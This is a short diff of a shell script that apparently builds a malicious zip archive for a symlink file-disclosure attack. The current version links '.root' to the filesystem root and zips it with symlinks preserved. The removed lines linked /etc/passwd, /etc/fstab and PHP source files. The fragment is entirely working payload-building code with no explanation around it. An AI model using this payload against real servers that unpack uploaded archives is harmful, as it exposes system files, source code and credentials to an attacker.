@@ -8,17 +8,10 @@ do
 done
 
 # add symlinks
-#ln -s /etc/passwd passwd
-#ln -s ../../index.php index
-#ln -s ../../url.php url
-#ln -s /etc/fstab fstab
-mkdir .blubb
 ln -s / .root
-cp testfile.txt .blubb/testfile.txt
-
 
 # zip stuff
-zip -r --symlinks cmd.zip testfile.txt .blubb .root
+zip --symlinks cmd.zip testfile.txt .root
 
 # cleanup
-rm -r .blubb .root testfile.txt
+rm .root testfile.txt
